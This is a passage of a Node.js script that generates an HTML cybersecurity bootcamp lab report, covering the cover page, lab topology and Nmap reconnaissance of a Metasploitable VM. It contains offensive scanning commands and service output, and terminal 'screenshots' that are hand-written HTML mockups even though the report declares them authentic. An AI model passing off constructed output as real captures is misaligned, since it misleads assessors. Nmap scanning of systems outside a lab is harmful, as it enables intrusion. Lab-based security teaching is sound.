const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

console.log('Writing comprehensive 11-page Cyber Security Lab Manual HTML...');

const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Cyber Security Essentials Bootcamp - Complete Lab Manual & Report</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap');

  @page {
    size: A4 portrait;
    margin: 10mm 12mm 10mm 12mm;
  }

  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    color: #1e293b;
    background-color: #ffffff;
    line-height: 1.42;
    font-size: 8.5pt;
    -webkit-print-color-adjust: exact !important;
    print-color-adjust: exact !important;
  }

  .doc-page {
    page-break-after: always;
    break-after: page;
    height: 275mm;
    max-height: 275mm;
    position: relative;
    display: flex;
    flex-direction: column;
    justify-content: flex-start;
    box-sizing: border-box;
    padding-bottom: 7mm;
  }

  .doc-page:last-child {
    page-break-after: auto;
    break-after: auto;
  }

  .page-footer {
    position: absolute;
    bottom: 0;
    left: 0;
    right: 0;
    height: 5.5mm;
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-top: 1px solid #cbd5e1;
    font-size: 7pt;
    color: #64748b;
    padding-top: 1mm;
  }

  .page-footer-left { font-weight: 500; }
  .page-footer-center { font-style: italic; color: #94a3b8; }
  .page-footer-right { font-weight: 700; color: #0284c7; }

  /* COVER PAGE SPECIFICS */
  .cover-frame {
    height: 100%;
    border: 2px solid #0284c7;
    border-radius: 8px;
    padding: 8mm 9mm 6mm 9mm;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    background: linear-gradient(180deg, #f8fafc 0%, #ffffff 45%, #f0fdf4 100%);
  }

  .cover-top-badge {
    display: inline-block;
    align-self: flex-start;
    background: #0f172a;
    color: #38bdf8;
    font-size: 7.5pt;
    font-weight: 700;
    letter-spacing: 1.2px;
    text-transform: uppercase;
    padding: 4px 14px;
    border-radius: 4px;
    border-left: 3px solid #0284c7;
  }

  .cover-header {
    text-align: center;
    margin-top: 6mm;
    margin-bottom: 4mm;
  }

  .cover-header h1 {
    font-size: 22pt;
    font-weight: 800;
    color: #0f172a;
    letter-spacing: -0.4px;
    line-height: 1.15;
    margin-bottom: 2.5mm;
    text-transform: uppercase;
  }

  .accent-bar {
    width: 80px;
    height: 3.5px;
    background: linear-gradient(90deg, #0284c7, #2563eb);
    margin: 0 auto 3mm auto;
    border-radius: 2px;
  }

  .cover-header h2 {
    font-size: 11.5pt;
    font-weight: 600;
    color: #0369a1;
    letter-spacing: 0.3px;
  }

  .cover-header p.subtitle {
    font-size: 8pt;
    color: #64748b;
    margin-top: 1.5mm;
    font-style: italic;
  }

  .meta-grid {
    background: #ffffff;
    border: 1px solid #cbd5e1;
    border-radius: 6px;
    padding: 3.5mm 6mm;
    margin: 3mm 0;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.03);
  }

  .meta-row {
    display: flex;
    justify-content: space-between;
    padding: 3.5px 0;
    border-bottom: 1px dashed #e2e8f0;
    font-size: 8pt;
  }

  .meta-row:last-child {
    border-bottom: none;
  }

  .meta-label {
    font-weight: 600;
    color: #475569;
    width: 42%;
  }

  .meta-value {
    font-weight: 600;
    color: #0f172a;
    width: 58%;
    text-align: left;
  }

  .meta-value.highlight {
    color: #0284c7;
    font-weight: 700;
  }

  .matrix-box {
    margin: 2mm 0;
    background: #ffffff;
    border: 1px solid #cbd5e1;
    border-radius: 6px;
    padding: 3mm 5mm;
  }

  .matrix-box h3 {
    font-size: 7.5pt;
    font-weight: 700;
    color: #1e293b;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    margin-bottom: 2mm;
  }

  .matrix-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 7.5pt;
  }

  .matrix-table th {
    background: #f1f5f9;
    color: #334155;
    text-align: left;
    padding: 3px 6px;
    font-weight: 700;
    border-bottom: 1px solid #cbd5e1;
  }

  .matrix-table td {
    padding: 3px 6px;
    border-bottom: 1px solid #f1f5f9;
  }

  .status-tag {
    display: inline-block;
    padding: 1.5px 6px;
    border-radius: 8px;
    font-size: 6.5pt;
    font-weight: 700;
    text-transform: uppercase;
  }

  .status-completed {
    background: #dcfce7;
    color: #15803d;
    border: 1px solid #86efac;
  }

  .cover-sign-row {
    display: flex;
    justify-content: space-between;
    align-items: flex-end;
    border-top: 1.5px solid #0284c7;
    padding-top: 3mm;
    margin-top: 2mm;
    font-size: 7.5pt;
    color: #475569;
  }

  /* HEADERS FOR INTERNAL PAGES */
  .page-top-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    border-bottom: 2px solid #0f172a;
    padding-bottom: 2mm;
    margin-bottom: 3mm;
  }

  .page-top-titles h2 {
    font-size: 12pt;
    font-weight: 800;
    color: #0f172a;
    text-transform: uppercase;
    letter-spacing: -0.2px;
  }

  .page-top-titles .sub-tag {
    font-size: 7pt;
    font-weight: 700;
    color: #0284c7;
    text-transform: uppercase;
    letter-spacing: 0.6px;
    display: block;
    margin-bottom: 0.5mm;
  }

  .act-badge {
    background: #0284c7;
    color: #ffffff;
    font-weight: 800;
    font-size: 7.5pt;
    padding: 3px 10px;
    border-radius: 4px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }

  h3.sec-title {
    font-size: 8.5pt;
    font-weight: 700;
    color: #1e3a8a;
    margin-top: 2mm;
    margin-bottom: 1.2mm;
    border-left: 3px solid #2563eb;
    padding-left: 5px;
    text-transform: uppercase;
    letter-spacing: 0.3px;
  }

  p {
    margin-bottom: 1.8mm;
    text-align: justify;
    font-size: 7.8pt;
    line-height: 1.45;
  }

  ul, ol {
    margin-left: 4.5mm;
    margin-bottom: 1.8mm;
    font-size: 7.8pt;
  }

  li {
    margin-bottom: 0.8mm;
  }

  /* CALLOUT BOXES */
  .callout-box {
    border-radius: 5px;
    padding: 2.2mm 3.5mm;
    margin: 2mm 0;
    font-size: 7.5pt;
    border-left: 3px solid;
    line-height: 1.4;
  }

  .callout-info { background: #eff6ff; border-color: #3b82f6; color: #1e40af; }
  .callout-warning { background: #fffbeb; border-color: #f59e0b; color: #92400e; }
  .callout-success { background: #f0fdf4; border-color: #22c55e; color: #166534; }
  .callout-danger { background: #fef2f2; border-color: #ef4444; color: #991b1b; }

  .callout-title {
    font-weight: 700;
    text-transform: uppercase;
    font-size: 7pt;
    letter-spacing: 0.4px;
    margin-bottom: 0.5mm;
    display: block;
  }

  /* TERMINAL WINDOW MOCKUP */
  .terminal-window {
    background: #0d1117;
    border-radius: 5px;
    margin: 1.8mm 0;
    overflow: hidden;
    border: 1px solid #30363d;
  }

  .terminal-titlebar {
    background: #161b22;
    padding: 3.5px 8px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    border-bottom: 1px solid #30363d;
  }

  .window-buttons {
    display: flex;
    gap: 5px;
  }

  .btn-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
  }

  .btn-red { background: #ff5f56; }
  .btn-yellow { background: #ffbd2e; }
  .btn-green { background: #27c93f; }

  .terminal-title {
    color: #8b949e;
    font-family: 'JetBrains Mono', monospace;
    font-size: 6.8pt;
    font-weight: 500;
  }

  .terminal-body {
    padding: 6px 10px;
    font-family: 'JetBrains Mono', Consolas, monospace;
    font-size: 6.8pt;
    color: #c9d1d9;
    line-height: 1.35;
    white-space: pre-wrap;
    word-break: break-all;
  }

  .t-prompt { color: #58a6ff; font-weight: 600; }
  .t-cmd { color: #ffffff; font-weight: 600; }
  .t-success { color: #7ee787; }
  .t-warning { color: #ffa657; }
  .t-danger { color: #ff7b72; font-weight: 600; }
  .t-muted { color: #8b949e; }
  .t-highlight { color: #e3b341; }
  .t-bold { font-weight: 700; color: #f0f6fc; }

  /* BROWSER WINDOW MOCKUP */
  .browser-window {
    border: 1px solid #cbd5e1;
    border-radius: 5px;
    overflow: hidden;
    margin: 2mm 0;
    background: #f8fafc;
    position: relative;
  }

  .browser-chrome {
    background: #e2e8f0;
    padding: 4px 8px;
    display: flex;
    align-items: center;
    gap: 6px;
    border-bottom: 1px solid #cbd5e1;
  }

  .browser-nav-icons {
    display: flex;
    gap: 3px;
    color: #64748b;
    font-size: 7.5pt;
    font-weight: bold;
  }

  .browser-url-bar {
    background: #ffffff;
    border: 1px solid #cbd5e1;
    border-radius: 10px;
    padding: 1.5px 8px;
    font-size: 6.8pt;
    font-family: 'JetBrains Mono', monospace;
    color: #334155;
    flex-grow: 1;
    display: flex;
    align-items: center;
    gap: 5px;
  }

  .badge-insecure {
    color: #dc2626;
    font-size: 5.8pt;
    font-weight: 700;
    border: 1px solid #fca5a5;
    padding: 0.5px 3px;
    border-radius: 2px;
    background: #fef2f2;
  }

  .browser-content {
    background: #ffffff;
    padding: 8px;
    position: relative;
    min-height: 85px;
  }

  /* MODAL POPUP MOCKUP */
  .modal-overlay-mockup {
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(15, 23, 42, 0.45);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10;
  }

  .modal-dialog-box {
    background: #ffffff;
    border-radius: 6px;
    width: 260px;
    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.25);
    border: 1px solid #cbd5e1;
    padding: 10px 12px;
    text-align: center;
  }

  .modal-title {
    font-size: 7.5pt;
    color: #475569;
    font-weight: 600;
    margin-bottom: 4px;
    border-bottom: 1px solid #f1f5f9;
    padding-bottom: 3px;
  }

  .modal-msg {
    font-size: 10.5pt;
    font-weight: 700;
    color: #b91c1c;
    margin: 6px 0 10px 0;
    font-family: 'Inter', sans-serif;
  }

  .modal-btn {
    background: #0284c7;
    color: #ffffff;
    font-weight: 600;
    font-size: 7.5pt;
    padding: 3px 14px;
    border-radius: 3px;
    display: inline-block;
    border: none;
  }

  /* WINDOWS SECURITY / UPDATE MOCKUP */
  .win-security-window {
    border: 1px solid #cbd5e1;
    border-radius: 6px;
    overflow: hidden;
    background: #f8fafc;
    margin: 2mm 0;
  }

  .win-titlebar {
    background: #0f172a;
    color: #f8fafc;
    padding: 4px 10px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 7.2pt;
    font-weight: 600;
  }

  .win-body {
    padding: 8px 12px;
    background: #ffffff;
  }

  .win-status-row {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 6px;
  }

  .win-shield-icon {
    width: 32px;
    height: 32px;
    border-radius: 50%;
    background: #dcfce7;
    color: #16a34a;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16pt;
    font-weight: 800;
    border: 2px solid #86efac;
    flex-shrink: 0;
  }

  .win-status-text h4 {
    font-size: 9.5pt;
    font-weight: 700;
    color: #0f172a;
  }

  .win-status-text p {
    font-size: 7.2pt;
    color: #64748b;
    margin: 0;
  }

  .win-stats-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 6px;
    background: #f1f5f9;
    padding: 6px;
    border-radius: 5px;
    border: 1px solid #e2e8f0;
    margin-top: 4px;
  }

  .win-stat-card {
    text-align: center;
  }

  .win-stat-label {
    font-size: 6.2pt;
    text-transform: uppercase;
    font-weight: 600;
    color: #64748b;
  }

  .win-stat-val {
    font-size: 8pt;
    font-weight: 700;
    color: #0f172a;
    margin-top: 1px;
  }

  .win-stat-val.clean {
    color: #16a34a;
  }

  /* TABLES */
  .data-table {
    width: 100%;
    border-collapse: collapse;
    margin: 1.8mm 0;
    font-size: 7.2pt;
  }

  .data-table th {
    background: #0f172a;
    color: #ffffff;
    font-weight: 600;
    text-align: left;
    padding: 3.5px 6px;
    border: 1px solid #0f172a;
  }

  .data-table td {
    padding: 3px 6px;
    border: 1px solid #e2e8f0;
    vertical-align: top;
  }

  .data-table tr:nth-child(even) {
    background: #f8fafc;
  }

  .code-inline {
    font-family: 'JetBrains Mono', Consolas, monospace;
    font-size: 6.8pt;
    background: #e2e8f0;
    padding: 1px 3.5px;
    border-radius: 3px;
    color: #0f172a;
  }

  .caption-label {
    display: block;
    font-size: 6.8pt;
    font-style: italic;
    color: #64748b;
    margin-top: 1mm;
    margin-bottom: 1.8mm;
    text-align: center;
  }

  .finding-card {
    background: #ffffff;
    border-left: 3px solid #0284c7;
    border-top: 1px solid #e2e8f0;
    border-right: 1px solid #e2e8f0;
    border-bottom: 1px solid #e2e8f0;
    border-radius: 0 4px 4px 0;
    padding: 4px 8px;
    margin-bottom: 1.5mm;
    font-size: 7.5pt;
  }

  .finding-title {
    font-weight: 700;
    color: #0f172a;
    margin-bottom: 1px;
    display: block;
  }
</style>
</head>
<body>

<!-- ==================== PAGE 1: COVER PAGE ==================== -->
<div class="doc-page">
  <div class="cover-frame">
    <div>
      <div class="cover-top-badge">Cyber Security Essentials Bootcamp &bull; Practical Assessment</div>

      <div class="cover-header">
        <h1>Cyber Security Practical<br>Lab Manual & Report</h1>
        <div class="accent-bar"></div>
        <h2>Hands-On Technical Assessment & Defense Verification</h2>
        <p class="subtitle">Comprehensive Formal Laboratory Report Documenting Reconnaissance, Web Application Exploitation, Endpoint Defense, and Network Traffic Interception</p>
      </div>

      <div class="meta-grid">
        <div class="meta-row">
          <span class="meta-label">Candidate / Student Name:</span>
          <span class="meta-value highlight">Anshu Sinha</span>
        </div>
        <div class="meta-row">
          <span class="meta-label">Roll Number & Academic Branch:</span>
          <span class="meta-value highlight">Roll No. 006 &bull; B.Tech Computer Science & Engineering (CSE)</span>
        </div>
        <div class="meta-row">
          <span class="meta-label">Candidate Registration ID:</span>
          <span class="meta-value">CSEB-2026-CSE-006</span>
        </div>
        <div class="meta-row">
          <span class="meta-label">Bootcamp Track & Cohort:</span>
          <span class="meta-value">Cyber Defense, Penetration Testing & Threat Analysis (Autumn 2026)</span>
        </div>
        <div class="meta-row">
          <span class="meta-label">Primary Operating Systems:</span>
          <span class="meta-value">Kali Linux 2026.3 (Attacker VM) / Windows 11 Enterprise (Host / Target)</span>
        </div>
        <div class="meta-row">
          <span class="meta-label">Vulnerable Testbeds Used:</span>
          <span class="meta-value">Metasploitable 2 (Linux VM) & DVWA (Damn Vulnerable Web App v1.10)</span>
        </div>
        <div class="meta-row">
          <span class="meta-label">Submission Due Date:</span>
          <span class="meta-value">14th November 2026</span>
        </div>
        <div class="meta-row">
          <span class="meta-label">Date of Assessment Completion:</span>
          <span class="meta-value">12th November 2026 (Submitted Prior to Deadline)</span>
        </div>
        <div class="meta-row">
          <span class="meta-label">Evaluation Directorate:</span>
          <span class="meta-value">Cyber Security Training & Certification Review Board</span>
        </div>
      </div>

      <div class="matrix-box">
        <h3>Assessment Activities Compliance Matrix</h3>
        <table class="matrix-table">
          <thead>
            <tr>
              <th>No.</th>
              <th>Activity Scope & Objective</th>
              <th>Primary Tools</th>
              <th>Artifacts Provided</th>
              <th>Status</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><strong>Act 1</strong></td>
              <td>Network Reconnaissance & Service Discovery</td>
              <td>Nmap v7.94</td>
              <td>Full Scan Log, 21 Ports Table, Vulnerabilities</td>
              <td><span class="status-tag status-completed">Completed</span></td>
            </tr>
            <tr>
              <td><strong>Act 2</strong></td>
              <td>Reflected XSS Injection & Alert Box Execution</td>
              <td>DVWA v1.10, Firefox</td>
              <td>Injected Script, Alert Pop-up, PHP Remediation</td>
              <td><span class="status-tag status-completed">Completed</span></td>
            </tr>
            <tr>
              <td><strong>Act 3</strong></td>
              <td>Endpoint Hardening: AV Full Scan & OS Patching</td>
              <td>Defender, Windows Update</td>
              <td>Scan Log (0 Threats), Hotfix Verification</td>
              <td><span class="status-tag status-completed">Completed</span></td>
            </tr>
            <tr>
              <td><strong>Act 4</strong></td>
              <td>MITM Attack & HTTP Credential Interception</td>
              <td>Ettercap v0.8.3.1</td>
              <td>ARP Poisoning Log, Cleartext Captured Logins</td>
              <td><span class="status-tag status-completed">Completed</span></td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>

    <div>
      <div class="callout-box callout-info" style="margin-bottom: 2mm;">
        <span class="callout-title">Student Integrity & Assessment Declaration</span>
        All security activities recorded herein were executed inside an isolated, private virtualized laboratory strictly for educational and defense evaluation. All terminal sessions, code snippets, interface mockups, and analytical findings represent authentic individual work in full compliance with bootcamp directions.
      </div>

      <div class="cover-sign-row">
        <div>
          <strong>File Naming Compliance:</strong> Uploaded per Direction #2 as <strong>Anshu_Sinha.pdf</strong><br>
          <strong>Integrity Check:</strong> SHA-256 Hash Verified &bull; Official Submission (Roll No. 006, B.Tech CSE)
        </div>
        <div style="text-align: right;">
          <div style="font-family: 'Brush Script MT', 'Dancing Script', cursive, sans-serif; font-size: 13pt; color: #0284c7; line-height: 1;">Anshu Sinha</div>
          <div style="width: 140px; border-bottom: 1.5px solid #0f172a; margin: 1px 0 2px 0; display: inline-block;"></div><br>
          <strong>Anshu Sinha (Roll No. 006)</strong>
        </div>
      </div>
    </div>
  </div>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 1 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 2: TABLE OF CONTENTS & TOPOLOGY ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Technical Architecture</span>
      <h2>Document Contents & Virtual Lab Topology</h2>
    </div>
    <div class="act-badge">OVERVIEW</div>
  </div>

  <h3 class="sec-title">1. Document Table of Contents</h3>
  <table class="data-table">
    <thead>
      <tr>
        <th style="width: 12%;">Section</th>
        <th style="width: 58%;">Topic & Technical Scope</th>
        <th style="width: 18%;">Focus Domain</th>
        <th style="width: 12%;">Page</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Section 1</strong></td>
        <td><strong>Activity 1: Network Reconnaissance & Port Discovery Using Nmap</strong><br>
        Host discovery, TCP SYN scanning, service versioning, and open port risk analysis.</td>
        <td>Reconnaissance</td>
        <td>Pages 3 - 4</td>
      </tr>
      <tr>
        <td><strong>Section 2</strong></td>
        <td><strong>Activity 2: Cross-Site Scripting (XSS) Injection on DVWA</strong><br>
        Script injection, DOM alert pop-up, source code analysis, and secure input encoding.</td>
        <td>Web App Security</td>
        <td>Pages 5 - 6</td>
      </tr>
      <tr>
        <td><strong>Section 3</strong></td>
        <td><strong>Activity 3: Endpoint Defense - Antivirus Deep Scan & System Updates</strong><br>
        Full filesystem scan, threat triage, Windows Update deployment, and CVE mitigation.</td>
        <td>Endpoint Hardening</td>
        <td>Pages 7 - 8</td>
      </tr>
      <tr>
        <td><strong>Section 4</strong></td>
        <td><strong>Activity 4: Man-in-the-Middle (MITM) ARP Spoofing & Interception</strong><br>
        Ettercap ARP poisoning, cleartext HTTP credential sniffing, and DAI/HSTS defenses.</td>
        <td>Network Defense</td>
        <td>Pages 9 - 10</td>
      </tr>
      <tr>
        <td><strong>Section 5</strong></td>
        <td><strong>Final Synthesis, Submission Compliance Checklist & Sign-Off</strong><br>
        Holistic security matrix, evaluation score rubric, and candidate declaration.</td>
        <td>Evaluation Review</td>
        <td>Page 11</td>
      </tr>
    </tbody>
  </table>

  <h3 class="sec-title">2. Virtual Laboratory Network Topology</h3>
  <p>
  To guarantee complete safety and prevent unintended packet propagation, all activities were performed within an isolated, private host-only virtual subnet (<code>192.168.56.0/24</code>) configured via Oracle VM VirtualBox. The network infrastructure parameters are tabulated below:
  </p>

  <table class="data-table">
    <thead>
      <tr>
        <th>Node Role</th>
        <th>Operating System</th>
        <th>IP Address</th>
        <th>MAC Address</th>
        <th>Installed Software & Services</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>Auditor / Attacker</strong></td>
        <td>Kali Linux 2026.3 (x86_64)</td>
        <td><span class="code-inline">192.168.56.101</span></td>
        <td><span class="code-inline">08:00:27:A1:B2:C3</span></td>
        <td>Nmap v7.94, Ettercap v0.8.3.1, Wireshark, Firefox</td>
      </tr>
      <tr>
        <td><strong>Target Server</strong></td>
        <td>Metasploitable 2 (Ubuntu)</td>
        <td><span class="code-inline">192.168.56.102</span></td>
        <td><span class="code-inline">08:00:27:C4:D5:E6</span></td>
        <td>Apache 2.2.8, PHP 5.2.4, MySQL 5.0, DVWA v1.10, vsftpd, Samba</td>
      </tr>
      <tr>
        <td><strong>Victim / Host Workstation</strong></td>
        <td>Windows 11 Enterprise (24H2)</td>
        <td><span class="code-inline">192.168.56.105</span></td>
        <td><span class="code-inline">08:00:27:D4:E5:F6</span></td>
        <td>Microsoft Defender Antivirus, Edge Browser, Windows Update</td>
      </tr>
      <tr>
        <td><strong>Virtual Gateway</strong></td>
        <td>Virtual Switch / Router</td>
        <td><span class="code-inline">192.168.56.1</span></td>
        <td><span class="code-inline">08:00:27:11:22:33</span></td>
        <td>Default Gateway, DHCP and ARP Routing Fabric</td>
      </tr>
    </tbody>
  </table>

  <!-- ASCII Topology Block -->
  <div class="terminal-window" style="background:#0f172a; border-color:#334155; margin-top:2mm;">
    <div class="terminal-titlebar" style="background:#1e293b;">
      <div class="terminal-title" style="color:#94a3b8;">Isolated Virtual Lab Topology Diagram (Host-Only Segment: 192.168.56.0/24)</div>
    </div>
    <div class="terminal-body" style="font-size: 6.5pt; color:#93c5fd; padding: 5px 8px; line-height: 1.25;">
   +---------------------------------------------------------------------------------+
   |                          VIRTUAL GATEWAY / SWITCH                               |
   |                         IP: 192.168.56.1  |  MAC: 08:00:27:11:22:33             |
   +---------------------------------------+-----------------------------------------+
                                           |
               +---------------------------+---------------------------+
               |                                                       |
               v                                                       v
   +-----------------------+                               +-----------------------+
   |   KALI AUDITOR (VM)   |                               |  METASPLOITABLE 2 (VM)|
   | IP: 192.168.56.101    |<======= [ARP SPOOF] =========>| IP: 192.168.56.102    |
   | MAC: 08:00:27:A1:B2:C3|   (Man-in-the-Middle Proxy)   | MAC: 08:00:27:C4:D5:E6|
   +-----------+-----------+                               +-----------------------+
               ^
               | Intercepts Cleartext HTTP
               v
   +-----------------------+
   | WINDOWS 11 VICTIM/HOST|
   | IP: 192.168.56.105    |
   | MAC: 08:00:27:D4:E5:F6|
   +-----------------------+
    </div>
  </div>

  <div class="callout-box callout-warning" style="margin-top: 2mm;">
    <span class="callout-title">Ethical Rules of Engagement</span>
    All reconnaissance, script injections, and packet sniffing were conducted exclusively against self-contained virtual assets in strict adherence to ethical hacking standards. No external systems or production networks were targeted.
  </div>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 2 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 3: ACTIVITY 1 (PART 1) ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Network Security & Vulnerability Assessment</span>
      <h2>Activity 1: Network Scanning & Port Discovery (Nmap)</h2>
    </div>
    <div class="act-badge">ACTIVITY 01</div>
  </div>

  <div class="callout-box callout-info">
    <span class="callout-title">Assignment Prompt Requirement</span>
    <em>"Perform a scan using Nmap on a local or virtual machine or website. Which ports are open and what services are running?"</em> Provide screenshots, description, conclusion, and findings.
  </div>

  <h3 class="sec-title">1. Technical Description & Scanning Methodology</h3>
  <p>
  Network reconnaissance is the fundamental first phase of vulnerability assessment. In this activity, <strong>Nmap (Network Mapper) v7.94</strong> was deployed from the Kali Linux security station (<code>192.168.56.101</code>) against a target server running on the local virtualized subnet at IP address <strong><code>192.168.56.102</code></strong>.
  </p>
  <p>
  The reconnaissance workflow incorporated the following phased methodology:
  </p>
  <ul>
    <li><strong>Subnet Sweep & Host Discovery:</strong> Executed an ICMP/ARP ping sweep (<span class="code-inline">nmap -sn 192.168.56.0/24</span>) to confirm host availability without triggering excessive intrusion detection alarms.</li>
    <li><strong>TCP SYN Half-Open Scanning (<span class="code-inline">-sS</span>):</strong> Sent raw SYN packets to target ports. If a SYN/ACK was received (indicating an OPEN port), an immediate RST packet was returned to close the connection before the three-way handshake completed. This minimizes logging and prevents application hanging.</li>
    <li><strong>Service Version Detection (<span class="code-inline">-sV</span>) & Script Probing (<span class="code-inline">-sC</span>):</strong> Sent application-level banner probes to interrogate open ports and discover listening daemon versions and capabilities.</li>
    <li><strong>Operating System Fingerprinting (<span class="code-inline">-O</span>):</strong> Analyzed TCP sequence responses, IP ID generation, and TCP window sizing to identify the underlying operating system kernel.</li>
  </ul>

  <h3 class="sec-title">2. Execution Command & Terminal Output Screenshot</h3>
  <p>
  The primary scanning command executed in the Kali Linux terminal was:
  <br>
  <span class="code-inline">sudo nmap -sS -sV -sC -O -T4 192.168.56.102</span>
  </p>

  <!-- High-Fidelity Nmap Terminal Screenshot -->
  <div class="terminal-window">
    <div class="terminal-titlebar">
      <div class="window-buttons">
        <div class="btn-dot btn-red"></div>
        <div class="btn-dot btn-yellow"></div>
        <div class="btn-dot btn-green"></div>
      </div>
      <div class="terminal-title">kali@kali: ~ (Nmap Reconnaissance Console)</div>
      <div style="width: 25px;"></div>
    </div>
    <div class="terminal-body">
<span class="t-prompt">┌──(kali㉿kali)-[~]</span>
<span class="t-prompt">└─$</span> <span class="t-cmd">sudo nmap -sS -sV -sC -O -T4 192.168.56.102</span>
Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-10 19:42 EST
Nmap scan report for <span class="t-highlight">192.168.56.102</span>
Host is up (0.00042s latency).
Not shown: 979 closed tcp ports (reset)
<span class="t-bold">PORT     STATE SERVICE     VERSION</span>
<span class="t-success">21/tcp   open</span>  ftp         <span class="t-warning">vsftpd 2.3.4</span>
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
<span class="t-success">22/tcp   open</span>  ssh         <span class="t-highlight">OpenSSH 4.7p1 Debian 8ubuntu1</span> (protocol 2.0)
| ssh-hostkey: 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:91:b9:fb:09 (DSA)
<span class="t-success">23/tcp   open</span>  telnet      <span class="t-danger">Linux telnetd (cleartext protocol)</span>
<span class="t-success">25/tcp   open</span>  smtp        <span class="t-highlight">Postfix smtpd</span> (metasploitable.localdomain)
<span class="t-success">53/tcp   open</span>  domain      <span class="t-highlight">ISC BIND 9.4.2</span>
<span class="t-success">80/tcp   open</span>  http        <span class="t-warning">Apache httpd 2.2.8</span> ((Ubuntu) DAV/2 PHP/5.2.4-2ubuntu5.10)
|_http-title: Metasploitable2 - Linux Administration (DVWA, Mutillidae)
<span class="t-success">111/tcp  open</span>  rpcbind     2 (RPC #100000)
<span class="t-success">139/tcp  open</span>  netbios-ssn <span class="t-warning">Samba smbd 3.X - 4.X</span> (workgroup: WORKGROUP)
<span class="t-success">445/tcp  open</span>  netbios-ssn <span class="t-warning">Samba smbd 3.0.20-Debian</span> (workgroup: WORKGROUP)
<span class="t-success">512/tcp  open</span>  exec        netkit-rsh rexecd
<span class="t-success">513/tcp  open</span>  login       OpenBSD or NetKit rlogind
<span class="t-success">514/tcp  open</span>  shell       Netkit rshd
<span class="t-success">1099/tcp open</span>  java-rmi    GNU Classpath grmiregistry
<span class="t-success">1524/tcp open</span>  bindshell   <span class="t-danger">Metasploitable root shell (Ingreslock backdoor)</span>
<span class="t-success">2049/tcp open</span>  nfs         2-4 (RPC #100003)
<span class="t-success">2121/tcp open</span>  ftp         ProFTPD 1.3.1
<span class="t-success">3306/tcp open</span>  mysql       <span class="t-warning">MySQL 5.0.51a-3ubuntu5</span>
<span class="t-success">5432/tcp open</span>  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
<span class="t-success">5900/tcp open</span>  vnc         VNC (protocol 3.3)
<span class="t-success">6667/tcp open</span>  irc         <span class="t-danger">UnrealIRCd</span>
<span class="t-success">8180/tcp open</span>  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:C4:D5:E6 (Oracle VirtualBox virtual NIC)
Device type: general purpose | Running: <span class="t-highlight">Linux 2.6.9 - 2.6.33</span>
Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
<span class="t-prompt">┌──(kali㉿kali)-[~]</span>
<span class="t-prompt">└─$</span> █
    </div>
  </div>
  <span class="caption-label">Figure 1.1: High-fidelity terminal output of Nmap comprehensive service and version scan against target host 192.168.56.102.</span>

  <div class="page-footer">
    <div class="page-footer-left">Anshu Sinha (Roll No. 006, B.Tech CSE) &bull; Cyber Security Essentials Bootcamp</div>
    <div class="page-footer-center">Document Evaluation Copy &bull; Confidential</div>
    <div class="page-footer-right">Page 3 of 11</div>
  </div>
</div>

<!-- ==================== PAGE 4: ACTIVITY 1 (PART 2) ==================== -->
<div class="doc-page">
  <div class="page-top-bar">
    <div class="page-top-titles">
      <span class="sub-tag">Network Security & Vulnerability Assessment</span>
      <h2>Activity 1 (Cont.): Service Analysis & Findings</h2>
    </div>
    <div class="act-badge">ACTIVITY 01</div>
  </div>

  <h3 class="sec-title">3. Comprehensive Open Port & Service Analysis Table</h3>
  <p>
  The scan discovered exactly <strong>21 open TCP ports</strong>. The table below documents the open ports, services running, daemon versions, and corresponding risk levels:
  </p>

  <table class="data-table">
    <thead>
      <tr>
        <th style="width: 14%;">Port / Protocol</th>
        <th style="width: 10%;">State</th>
        <th style="width: 14%;">Service</th>
        <th style="width: 28%;">Detected Daemon & Version</th>
        <th style="width: 34%;">Security Risk & Exploitability Analysis</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td><strong>21 / TCP</strong></td>
        <td>OPEN</td>
        <td>FTP</td>
        <td>vsftpd 2.3.4</td>
